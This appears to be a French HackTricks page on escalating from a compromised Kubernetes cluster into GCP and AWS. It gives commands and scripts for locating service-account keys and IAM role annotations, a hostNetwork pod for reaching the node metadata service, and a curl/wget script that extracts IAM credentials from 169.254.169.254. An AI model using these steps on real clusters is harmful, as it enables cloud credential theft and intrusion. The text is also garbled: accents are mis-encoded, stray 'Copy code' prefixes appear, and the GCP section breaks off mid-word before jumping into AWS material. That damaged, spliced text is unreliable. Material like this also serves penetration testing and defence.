# Pivoting vers les clouds Kubernetes

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## GCP

Si vous ex√©cutez un cluster k8s √† l'int√©rieur de GCP, vous voudrez probablement qu'une application s'ex√©cutant √† l'int√©rieur du cluster ait un certain acc√®s √† GCP. Il existe 2 fa√ßons courantes de le faire :

### Montage des cl√©s GCP-SA en tant que secret

Une fa√ßon courante de donner **acc√®s √† une application Kubernetes √† GCP** est de :

* Cr√©er un compte de service GCP
* Lier les autorisations souhait√©es √† celui-ci
* T√©l√©charger une cl√© json du SA cr√©√©
* Montez-le en tant que secret √† l'int√©rieur du pod
* D√©finissez la variable d'environnement GOOGLE\_APPLICATION\_CREDENTIALS pointant vers le chemin o√π se trouve le json.

{% hint style="warning" %}
Par cons√©quent, en tant qu'**attaquant**, si vous compromettez un conteneur √† l'int√©rieur d'un pod, vous devez v√©rifier cette **variable d'environnement** et les **fichiers json** avec les informations d'identification GCP.
{% endhint %}

### Relier le json GSA au secret KSA

Une fa√ßon de donner acc√®s √† un GSA √† un cluster GKE consiste √† les lier de cette mani√®re :

* Cr√©ez un compte de service Kubernetes dans le m√™me espace de noms que votre cluster GKE en utilisant la commande suivante :

```bash
Copy codekubectl create serviceaccount <service-account-name>
```

* Cr√©ez un secret Kubernetes qui contient les informations d'identification du compte de service GCP auquel vous souhaitez accorder l'acc√®s au cluster GKE. Vous pouvez le faire en utilisant l'outil en ligne de commande `gcloud`, comme le montre l'exemple suivant :

```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
    --iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
    --from-file=key.json=<key-file-name>.json
```

* Liez le secret Kubernetes au compte de service Kubernetes en utilisant la commande suivante :

```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
    iam.gke.io/gcp-service-account=<gcp-service-account-email>
```

{% hint style="warning" %}
Dans la **deuxi√®me √©tape**, les **informations d'identification du GSA ont √©t√© d√©finies en tant que secret du KSA**. Ensuite, si vous pouvez **lire ce secret** depuis **l'int√©rieur** du **cluster GKE**, vous pouvez **escalader vers ce compte de service GCP**.
{% endhint %}

### Identit√© de charge de travail GKE

Avec Workload Identity, nous pouvons configurer un [compte de service Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) pour agir en tant que [compte de service Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Les pods s'ex√©cutant avec le compte de service Kubernetes s'authentifieront automatiquement en tant que compte de service Google lorsqu'ils acc√©deront aux API Google Cloud.

La **premi√®re s√©rie d'√©tapes** pour activer ce comportement consiste √† **activer Workload Identity dans GCP** ([**√©tapes**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) et √† cr√©er le compte de service GCP que vous souhaitez que k8s impersonne.

* **Activer Workload Identity** sur un nouveau cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
    --region=us-central1 \
    --workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Cr√©er/Mettre √† jour un nouveau pool de n≈ìuds** (Les clusters Autopilot n'ont pas besoin de cela)

{% code overflow="wrap" %}
```bash
# Vous pouvez mettre √† jour au lieu de cr√©er
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Cr√©ez le **compte de service GCP √† imiter** √† partir de K8s avec des autorisations GCP :

{% code overflow="wrap" %}
```bash
# Cr√©er un compte de service appel√© "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Donner le r√¥le "roles/iam.securityReviewer" au SA
gcloud projects add-iam-policy-binding <project-id> \
    --member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
    --role "roles/iam.securityReviewer"
```
{% endcode %}

* **Connectez-vous** au **cluster** et **cr√©ez** le **compte de service** √† utiliser

{% code overflow="wrap" %}
```bash
# Obtenez les informations d'identification k8s
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# G√©n√©rez notre espace de noms de test
kubectl create namespace testing

# Cr√©ez le KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Liez le GSA avec le K
#### Cr√©er un Pod avec un r√¥le IAM

{% hint style="info" %}
Le r√¥le IAM √† indiquer doit √™tre dans le m√™me compte AWS que le r√¥le kiam/kube2iam et ce r√¥le doit pouvoir y acc√©der.
{% endhint %}

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: transaction-metadata
  name: alpine
  namespace: eevee
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

### R√¥le IAM pour les comptes de service K8s via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

C'est la **m√©thode recommand√©e par AWS**.

1. Tout d'abord, vous devez [cr√©er un fournisseur OIDC pour le cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Ensuite, vous cr√©ez un r√¥le IAM avec les autorisations dont le compte de service aura besoin.
3. Cr√©ez une [relation de confiance entre le r√¥le IAM et le compte de service](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nom (ou les espaces de noms donnant acc√®s au r√¥le √† tous les comptes de service de l'espace de noms). _La relation de confiance v√©rifiera principalement le nom du fournisseur OIDC, le nom de l'espace de noms et le nom du compte de service_.
4. Enfin, **cr√©ez un compte de service avec une annotation indiquant l'ARN du r√¥le**, et les pods s'ex√©cutant avec ce compte de service auront **acc√®s au jeton du r√¥le**. Le **jeton** est **√©crit** dans un fichier et le chemin est sp√©cifi√© dans **`AWS_WEB_IDENTITY_TOKEN_FILE`** (par d√©faut : `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)

```bash
# Cr√©er un compte de service avec un r√¥le
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-service-account
  namespace: default
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Ajouter un r√¥le √† un compte de service existant
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```

Pour **obtenir aws en utilisant le jeton** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ex√©cutez :

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant, si vous pouvez √©num√©rer un cluster K8s, v√©rifiez les **comptes de service avec cette annotation** pour **escalader vers AWS**. Pour ce faire, **ex√©cutez/cr√©ez** simplement un **pod** en utilisant l'un des **comptes de service privil√©gi√©s IAM** et volez le jeton.

De plus, si vous √™tes √† l'int√©rieur d'un pod, v√©rifiez les variables d'environnement comme **AWS\_ROLE\_ARN** et **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Parfois, la **politique de confiance d'un r√¥le** peut √™tre **mal configur√©e** et au lieu de donner l'acc√®s AssumeRole au compte de service attendu, elle le donne √† **tous les comptes de service**. Par cons√©quent, si vous √™tes capable d'√©crire une annotation sur un compte de service contr√¥l√©, vous pouvez acc√©der au r√¥le.

Consultez la **page suivante pour plus d'informations** :
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Trouver les Pods et les comptes de service avec des r√¥les IAM dans le cluster

Il s'agit d'un script pour **it√©rer facilement sur tous les pods et les d√©finitions de comptes de service** en **recherchant** cette **annotation** :

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
    for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
done | grep -B 1 "amazonaws.com"
```

### R√¥le IAM du n≈ìud

La section pr√©c√©dente portait sur la fa√ßon de voler des r√¥les IAM avec des pods, mais notez qu'un **n≈ìud du** cluster K8s va √™tre une **instance √† l'int√©rieur du cloud**. Cela signifie que le n≈ìud va tr√®s probablement avoir un nouveau r√¥le IAM que vous pouvez voler (_notez que g√©n√©ralement tous les n≈ìuds d'un cluster K8s auront le m√™me r√¥le IAM, il peut donc ne pas √™tre utile de v√©rifier chaque n≈ìud_).

Cependant, il y a une exigence importante pour acc√©der √† l'endpoint de m√©tadonn√©es √† partir du n≈ìud, vous devez √™tre dans le n≈ìud (session ssh ?) ou au moins avoir le m√™me r√©seau :

```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

### Voler le jeton de r√¥le IAM

Nous avons pr√©c√©demment discut√© de la fa√ßon de **attacher des r√¥les IAM √† des pods** ou m√™me de la fa√ßon de **s'√©chapper vers le n≈ìud pour voler le r√¥le IAM** que l'instance a attach√© √† celui-ci.

Vous pouvez utiliser le script suivant pour **voler** vos nouvelles **informations d'identification de r√¥le IAM** :

```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
    echo "R√¥le IAM d√©couvert : $IAM_ROLE_NAME"
    if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
        echo "Informations d'identification :"
        curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
    fi
fi
```

## R√©f√©rences

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e